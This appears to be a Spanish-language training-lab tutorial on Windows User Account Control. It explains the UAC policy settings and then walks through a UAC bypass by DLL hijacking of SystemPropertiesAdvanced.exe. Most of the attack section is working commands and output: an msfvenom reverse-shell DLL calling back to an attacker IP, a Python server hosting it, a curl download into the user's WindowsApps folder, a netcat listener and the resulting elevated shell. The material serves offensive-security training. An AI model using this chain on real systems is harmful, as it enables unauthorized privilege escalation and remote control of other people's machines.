@@ -1,0 +1,276 @@
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que permite una solicitud de consentimiento para actividades elevadas. Las aplicaciones tienen diferentes niveles de `integrity` y un programa con un nivel alto puede realizar tareas que podrían comprometer el sistema. Cuando UAC está habilitado, las aplicaciones y tareas siempre se ejecutan bajo el contexto de seguridad de una cuenta no administrativa, a menos que un administrador autorice explícitamente a estas aplicaciones/tareas para tener acceso a nivel de administrador en el sistema. Es una característica de conveniencia que protege a los administradores de cambios no deseados, pero no se considera un límite de seguridad.
+
+Cuando UAC está en funcionamiento, un usuario puede iniciar sesión en su sistema con su cuenta de usuario estándar. Cuando se lanzan procesos utilizando un token de usuario estándar, pueden realizar tareas usando los derechos otorgados a un usuario estándar. Algunas aplicaciones requieren permisos adicionales para ejecutarse, y UAC puede proporcionar derechos de acceso adicionales al token para que funcionen correctamente.
+
+Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) analiza en profundidad cómo funciona UAC e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC específico para su organización a nivel local (usando secpol.msc), o configurado y distribuido a través de Group Policy Objects (GPO) en un entorno de dominio Active Directory. Los diversos ajustes se analizan en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Group Policy que se pueden establecer para UAC. La siguiente tabla proporciona detalles adicionales:
+
+| Group Policy Setting | Registry Key | Default Setting |
+| --- | --- | --- |
+| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account) | FilterAdministratorToken | Disabled |
+| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle | Disabled |
+| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode) | ConsentPromptBehaviorAdmin | Prompt for consent for non-Windows binaries |
+| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users) | ConsentPromptBehaviorUser | Prompt for credentials on the secure desktop |
+| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation) | EnableInstallerDetection | Enabled (default for home) Disabled (default for enterprise) |
+| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated) | ValidateAdminCodeSignatures | Disabled |
+| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations) | EnableSecureUIAPaths | Enabled |
+| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode) | EnableLUA | Enabled |
+| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation) | PromptOnSecureDesktop | Enabled |
+| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations) | EnableVirtualization | Enabled |
+
+[Source](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings)
+
+![image](https://academy.hackthebox.com/storage/modules/67/uac.png)
+
+UAC debe estar habilitado, y aunque puede que no detenga a un atacante de obtener privilegios, es un paso adicional que puede ralentizar este proceso y obligarlos a volverse más ruidosos.
+
+La cuenta de `default RID 500 administrator` siempre opera en el nivel alto obligatorio. Con Admin Approval Mode (AAM) habilitado, cualquier nueva cuenta de administrador que creemos operará en el nivel medio obligatorio por defecto y se le asignarán dos tokens de acceso separados al iniciar sesión. En el ejemplo a continuación, la cuenta de usuario `sarah` está en el grupo de administradores, pero cmd.exe está ejecutándose actualmente en el contexto de su token de acceso no privilegiado.
+
+### Checking Current User
+
+```r
+C:\htb> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name         SID
+================= ==============================================
+winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
+```
+
+### Confirming Admin Group Membership
+
+```r
+C:\htb> net localgroup administrators
+
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+mrb3n
+sarah
+The command completed successfully.
+```
+
+### Reviewing User Privileges
+
+```r
+C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+```
+
+### Confirming UAC is Enabled
+
+No hay versión de línea de comandos de la solicitud de consentimiento de la GUI, por lo que tendremos que eludir UAC para ejecutar comandos con nuestro token de acceso privilegiado. Primero, confirmemos si UAC está habilitado y, de ser así, a qué nivel.
+
+```r
+C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    EnableLUA    REG_DWORD    0x1
+```
+
+### Checking UAC Level
+
+```r
+C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
+```
+
+El valor de `ConsentPromptBehaviorAdmin` es `0x5`, lo que significa que el nivel más alto de UAC de `Always notify` está habilitado. Hay menos elusiones de UAC en este nivel más alto.
+
+### Checking Windows Version
+
+Las elusiones de UAC aprovechan fallas o funcionalidades no intencionadas en diferentes versiones de Windows. Examinemos la versión de Windows en la que buscamos elevar.
+
+```r
+PS C:\htb> [environment]::OSVersion.Version
+
+Major  Minor  Build  Revision
+-----  -----  -----  --------
+10     0      14393  0
+```
+
+Esto devuelve la versión de compilación 14393, que utilizando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página cruzamos con la versión de Windows `1607`.
+
+![image](https://academy.hackthebox.com/storage/modules/67/build.png)
+
+El proyecto [UACME](https://github.com/hfiref0x/UACME) mantiene una lista de elusiones de UAC, incluyendo información sobre el número de compilación de Windows afectado, la técnica utilizada y si Microsoft ha emitido una actualización de seguridad para solucionarlo. Utilicemos la técnica número 54, que se afirma que funciona desde la compilación 14393 de Windows 10. Esta técnica apunta a la versión de 32 bits del binario de auto-elevación `SystemPropertiesAdvanced.exe`. Hay muchos binarios de confianza que Windows permitirá autoelevar sin necesidad de una solicitud de consentimiento de UAC.
+
+Según [esta](https://egre55.github.io/system-properties-uac-bypass) publicación de blog, la versión de 32 bits de `SystemPropertiesAdvanced.exe` intenta cargar la DLL inexistente srrstr.dll, que es utilizada por la funcionalidad de Restauración del Sistema.
+
+Al intentar localizar una DLL, Windows utilizará el siguiente orden de búsqueda.
+
+1. El directorio desde el cual se cargó la aplicación.
+2. El directorio del sistema `C:\Windows\System32` para sistemas de 64 bits.
+3. El directorio del sistema de 16 bits `C:\Windows\System` (no soportado en sistemas de 64 bits).
+4. El directorio de Windows.
+5. Cualquier directorio que esté listado en la variable de entorno PATH.
+
+### Reviewing Path Variable
+
+Examinemos la variable path utilizando el comando `cmd /c echo %PATH%`. Esto revela las carpetas predeterminadas a continuación. La carpeta `WindowsApps` está dentro del perfil del usuario y es escribible por el usuario.
+
+```r
+PS C:\htb> cmd /c echo %PATH%
+
+C:\Windows\system32;
+C:\Windows;
+C:\Windows\System32\Wbem;
+C:\Windows\System32\WindowsPowerShell\v1.0\;
+C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
+```
+
+Podemos potencialmente eludir UAC en esto utilizando la técnica de secuestro de DLL colocando una DLL maliciosa `srrstr.dll` en la carpeta `WindowsApps`, que será cargada en un contexto elevado.
+
+### Generating Malicious srrstr.dll DLL
+
+Primero, generemos una DLL para ejecutar una reverse shell
+
+.
+
+```r
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of dll file: 5120 bytes
+```
+
+Nota: En el ejemplo anterior, especificamos nuestra dirección IP VPN tun0.
+
+### Starting Python HTTP Server on Attack Host
+
+Copiamos la DLL generada a una carpeta y configuramos un mini servidor web Python para alojarla.
+
+```r
+sudo python3 -m http.server 8080
+```
+
+### Downloading DLL Target
+
+Descargamos la DLL maliciosa al sistema objetivo y configuramos un `Netcat` listener en nuestra máquina de ataque.
+
+```r
+PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
+```
+
+### Starting nc Listener on Attack Host
+
+```r
+nc -lvnp 8443
+```
+
+### Testing Connection
+
+Si ejecutamos el archivo DLL malicioso `srrstr.dll`, recibiremos una shell de vuelta mostrando los derechos de usuario normal (UAC habilitado). Para probar esto, podemos ejecutar la DLL utilizando `rundll32.exe` para obtener una conexión de reverse shell.
+
+```r
+C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+```
+
+Una vez que recibimos una conexión de vuelta, veremos derechos de usuario normales.
+
+```r
+nc -lnvp 8443
+
+listening on [any] 8443 ...
+
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+
+C:\Users\sarah> whoami /priv
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+```
+
+### Executing SystemPropertiesAdvanced.exe on Target Host
+
+Ahora, podemos ejecutar la versión de 32 bits de `SystemPropertiesAdvanced.exe` desde el host objetivo.
+
+```r
+C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+```
+
+### Receiving Connection Back
+
+Verificando en nuestro listener, deberíamos recibir una conexión casi al instante.
+
+```r
+nc -lvnp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+
+whoami
+winlpe-ws03\sarah
+
+
+C:\Windows\system32>whoami /priv
+
+whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+```
+
+Esto es exitoso, y recibimos una shell elevada que muestra que nuestros privilegios están disponibles y pueden habilitarse si es necesario.
